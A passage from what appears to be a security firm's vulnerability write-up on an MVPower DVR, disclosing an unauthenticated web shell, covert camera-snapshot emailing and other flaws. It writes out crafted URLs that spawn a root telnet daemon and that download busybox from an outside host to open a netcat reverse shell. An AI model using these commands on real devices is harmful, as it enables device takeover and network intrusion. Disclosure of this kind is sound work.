The device is already running telnet on port 23, but it requires the root password. Even though we can see /etc/passwd and get the descrypt hash, we still don’t have the password.

![DVRCCTV7](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![DVRCCTV7](https://www.pentestpartners.com/content/uploads/2016/02/DVRCCTV7.png)

We are running this through our password cracker to see if we can get the password, but it may take some time.

To get around this, we use the remote web shell to start a new already logged-in telnet daemon:

http://192.168.3.101/shell?/usr/sbin/telnetd -l/bin/sh -p 25

We can now telnet in and use the device normally.

![DVRCCTV8](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![DVRCCTV8](https://www.pentestpartners.com/content/uploads/2016/02/DVRCCTV8.png)

This is fun, but most users will only have forwarded the outside world to port 80. An attacker can start telnet on port 25, but would be unable to access it.

### Reverse shell

The way to work around this is to setup a reverse shell. An attacker causes the DVR to connect back to a host under his control. As long as the user allows outbound connections, this will succeed – it’s a great way of bypassing NAT and firewalls. Domestic and small-business networks very rarely perform any outbound filtering.

Normally, we would use the tool netcat to setup a reverse shell.. The DVR uses busybox to provide the bulk of shell functionality, like many small embedded devices. As usual, the selection of commands available is arbitrary. Unfortunately, netcat is not available. We can fix this.

The DVR uses an ARM processor. This means that it’s generally not possible to just download netcat or busybox – we need to compile it.

Compiling for embedded systems can get awkward, especially if you need to interact with hardware. Thankfully, busybox and netcat don’t have many requirements. We just need to build a statically linked binary for the right architecture. It has to be statically linked to avoid dependencies on libraries that many not be present or may be out of date. This will make the binary much larger, but on this device we don’t have space constraints.

Now we have busybox with netcat. Now to get this on the DVR and running.

1. Find a writeable directory. The bulk of the filesystem is read only – you can’t even change the passwords or add a user. This is a DVR though, so we have a massive hard drive mounted in /root/rec/a1
2. Use wget to download the new busybox binary into this directory
3. Make busybox executable
4. Run the netcat reverse shell

This ends up with the final command of:

http://192.168.3.101/shell?cd /root/rec/a1 && wget

%68%74%74%70%3a%2f%2f%32%31%32%2e%31%31%31%2e%34%33%2e%

31%36%31%2f%62%75%73%79%62%6f%78%20 && chmod %2bx busybox

&& ./busybox nc 1.2.3.4 8000 -e /bin/sh -e /bin/sh

The wget URL needs to be URL encoded – it is actually:

http://1.2.3.4/busybox

Our netcat listener on our server receives a connection, and now we can interact with the DVR, simply by visiting a crafted URL on it.

[![DVRCCTV9](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![DVRCCTV9](https://www.pentestpartners.com/content/uploads/2016/02/DVRCCTV9-300x118.png)](https://www.pentestpartners.com/content/uploads/2016/02/DVRCCTV9.png)

### Sends stills to a strange hardcoded email address

Looking into the dvr\_app binary further, we can find some very odd functionality.

For whatever reason, snapshots of the first camera are sent to [[email protected]](/cdn-cgi/l/email-protection).

[![DVRCCTV10](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![DVRCCTV10](https://www.pentestpartners.com/content/uploads/2016/02/DVRCCTV10-300x92.png)](https://www.pentestpartners.com/content/uploads/2016/02/DVRCCTV10.png)

Why? We have no idea. The email address is still live, and is now being sent the intro to Button Moon frame by frame.

Sending images from a DVR like this is a serious breach of privacy.

Strangely, someone else had already reported this issue on the GitHub page of Frank Law, the owner of the email address:

[https://web.archive.org/web/20151010191622/https://github.com/lawishere/JUAN-Device/issues/1](https://web.archive.org/web/20151010191622/https%3A//github.com/lawishere/JUAN-Device/issues/1)

He has since pulled the https://github.com/lawishere repo.

It appears that there are several versions of the firmware present.

* Some don’t have any email functionality – you have nothing to worry about apart from the authentication bypass and root shell.
* Some have the email functionality, but aren’t sending any emails as the default SMTP server is no longer present.
* Some have the email functionality.

A GitHub repo (https://github.com/simonjiuan/ipc) containing code related to the DVR has been found by a commenter on HackerNews. This has some of the functionality in it, but the actual part when the email is sent is commented out.

This repo appears to be setup for an IP camera, with a different make and model. Look at the top right though – the repo has been forked 9 times. Where else is this code used?

### Other issues

It doesn’t end there though. This device is just a catalogue of mistakes:

* If you get a shell or command injection via the web server, you are root already. No need to escalate.
* No CSRF protection. You can trick a user into clicking a link that will carry out an action on their behalf.
* No account lock-out or brute force protection. You can guess as many passwords as you like. The only rate limiting is the device itself being slow.
* No HTTPS. All communications are sent in the plain and can be intercepted and tampered with.
* No firmware updates. We can’t find any detail on the name MVPower. The firmware suggests commonality with Juantech, but none of their firmwares are compatible. You are stuck with these issues.

### Our advice

Putting one of these on your network leaves you open to serious risk. If you port forward to the web interface, you are allowing attackers to take full control of the device. This can then be used as a pivot and be used to attack the rest of your network from inside.

### Share

### Categories

Show all
Android  (71)
Automotive Security  (24)
Aviation Cyber Security  (44)
Blockchain  (3)
Breach Handling  (1)
Careers At PTP  (1)
Cloud Security  (5)
Code Repository  (1)
Consultancy advice  (5)
Consumer Advice  (35)
Cyber Essentials  (1)
Cyber Liability Insurance  (5)
DFIR  (29)
Hardware Hacking  (20)
Heartbleed  (5)
Honeypots  (6)
How-Tos  (264)
In the news  (1)
Internet Of Things  (169)
Macs / Apple  (31)
Maritime Cyber Security  (48)
Medical Device Security  (3)
Opinions  (107)
OPSEC  (9)
OT, ICS, IIoT, SCADA  (22)
Passwords  (39)
PCI Advice  (2)
Ransomware  (2)
Red Teaming  (26)
Reverse Engineering  (12)
Security Blog  (808)
Shameless Self Promotion  (11)
Show on homepage  (6)
Social Engineering  (12)
Sustainability  (2)
Virtual Environments  (1)
Vulnerabilities that aren’t  (4)
Vulnerability Advisory  (45)
Vulnerability Disclosure  (20)

[# See the other cool stuff we've been doing…](/blog/)

[Maritime Cyber Security

# Cyber security guidance for small fleet operators

24 Jan 2025](https://www.pentestpartners.com/security-blog/cyber-security-guidance-for-small-fleet-operators/)

[Hardware Hacking

# How to secure body-worn cameras and protect footage from cyber threats

21 Jan 2025](https://www.pentestpartners.com/security-blog/how-to-secure-body-worn-cameras-and-protect-footage-from-cyber-threats/)

[Consumer Advice

# Security flaws found in tiny phones promoted to children

15 Jan 2025](https://www.pentestpartners.com/security-blog/security-flaws-found-in-tiny-phones-promoted-to-children/)

[DFIR

# Tackling AI threats. Advanced DFIR methods and tools for deepfake detection

13 Jan 2025](https://www.pentestpartners.com/security-blog/tackling-ai-threats-advanced-dfir-methods-and-tools-for-deepfake-detection/)

[Aviation Cyber Security

# The unexpected effects of GPS spoofing on aviation safety

09 Jan 2025](https://www.pentestpartners.com/security-blog/the-unexpected-effects-of-gps-spoofing-on-aviation-safety/)

[Services

### Penetration Testing

Find out more »](https://www.pentestpartners.com/penetration-testing-services/penetration-testing/)

### Our People

Being introduced to, and getting to know your tester is an often overlooked part of the process. Yes, our work is über technical, but faceless relationships do nobody any good.

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/ic-alert.svg)](https://www.pentestpartners.com/penetration-testing-services/suffered-a-security-breach/)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/ic-mobile-security.svg)
## Mobile Security](https://www.pentestpartners.com/penetration-testing-services/mobile-security/)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/ic-social-engineering-grey.svg)
## Social Engineering](https://www.pentestpartners.com/penetration-testing-services/social-engineering/)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/ic-webapp.svg)
## Web application testing](https://www.pentestpartners.com/penetration-testing-services/web-application-testing/)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/ic-data-compliance-grey.svg)
## Security Consuting](https://www.pentestpartners.com/penetration-testing-services/security-consulting/)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/ic-papa-grey.svg)
## Papa - PTP Advance Password Auditor](https://www.pentestpartners.com/penetration-testing-services/papa/)

### Get in touch

**UK Office:**

Pen Test Partners LLP

Unit 2, Verney Junction Business Park

Buckingham

MK18 2LB

United Kingdom

+44 20 3095 0500
[Contact Us »](/contact-us/)

###

**US Office:**

+1 646 693 2501
[[email protected]](/cdn-cgi/l/email-protection#056c6b636a4575606b71607671756477716b6077762b666a68)

### Connect

[Twitter](https://twitter.com/PentestPartners)
[LinkedIn](https://www.linkedin.com/company/pen-test-partners)
[YouTube](https://www.youtube.com/channel/UC2HCAhj6JiOsV_PcMFrjykw)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/crest-logo-22.png)](https://www.crest-approved.org/member_companies/pen-test-partners/)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/crest-pentest-logo-22.png)](https://www.crest-approved.org/member_companies/pen-test-partners/)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/crest-star-logo-22.png)](https://www.crest-approved.org/member_companies/pen-test-partners/)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/crest-star-fs-logo-22.png)](https://www.crest-approved.org/member_companies/pen-test-partners/)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/csir-logo-22.png)](https://www.crest-approved.org/member_companies/pen-test-partners/)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/crest-ovs-logo-22.png)](https://www.crest-approved.org/member_companies/pen-test-partners/)

[![logo-cbest](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/logo-cbest.png)](https://www.crest-approved.org/member_companies/pen-test-partners/)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/logo-check-ncsc.png)](https://www.ncsc.gov.uk/organisations/pen-test-partners)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/crest-assure.png)](https://www.crest-approved.org/member_companies/pen-test-partners/)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/logo-cyber-essentials2023.png)](https://iasme.co.uk/cyber-essentials/)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/bsi-iso27001-logo-22.png)](/content/uploads/2023/12/PTP-ISO27001-Certificate-2023.pdf)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/logo-pci-certified.png)](https://www.pcisecuritystandards.org/assessors_and_solutions/qualified_security_assessors)

[Privacy Policy](/privacy-policy/)

[Terms of Service](/terms-of-website-use/)

Manage Cookies

Company number: OC353362

VAT reg number: GB825526427

© 2025 Pen Test Partners


